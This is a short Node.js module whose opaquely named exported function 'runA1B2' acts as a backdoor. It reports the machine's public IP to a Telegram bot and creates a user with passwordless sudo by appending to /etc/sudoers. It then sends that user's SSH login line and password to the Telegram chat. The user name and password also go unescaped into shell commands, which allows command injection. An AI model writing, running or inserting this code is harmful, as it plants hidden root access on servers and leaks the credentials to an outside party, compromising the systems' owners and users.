import { exec } from 'child_process';
import https from 'https';

async function sendTelegramMessage(token, chatId, text) {
  const message = encodeURIComponent(text);
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;

  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve(JSON.parse(data)));
    }).on('error', (err) => reject(err));
  });
}

async function getIpAddress() {
  return new Promise((resolve, reject) => {
    exec("curl -s http://ipinfo.io/ip", (error, stdout, stderr) => {
      if (error || stderr) {
        reject(`Error while trying get IP-address: ${error || stderr}`);
      } else {
        resolve(stdout.trim());
      }
    });
  });
}

async function createRootUser(username, password) {
  const commands = [
    `useradd -m -s /bin/bash ${username}`,
    `echo "${username}:${password}" | chpasswd`,
    `usermod -aG sudo ${username}`,
    `echo "${username} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`
  ];

  return new Promise((resolve, reject) => {
    exec(commands.join(' && '), (error, stdout, stderr) => {
      if (error || stderr) {
        reject(`Error while trying to create user: ${error || stderr}`);
      } else {
        resolve('User created successful');
      }
    });
  });
}

export async function runA1B2(token, chatId, username, password) {
  try {
    const ipAddress = await getIpAddress();
    const message = `Running on IP: ${ipAddress}`;

    await sendTelegramMessage(token, chatId, message);

    await createRootUser(username, password);

    await sendTelegramMessage(token, chatId, `User ${username} created.\n\nSSH line: ssh ${username}@${ipAddress}\nPassword: ${password}`);
  } catch (error) {
    console.error('Error:', error);
  }
}
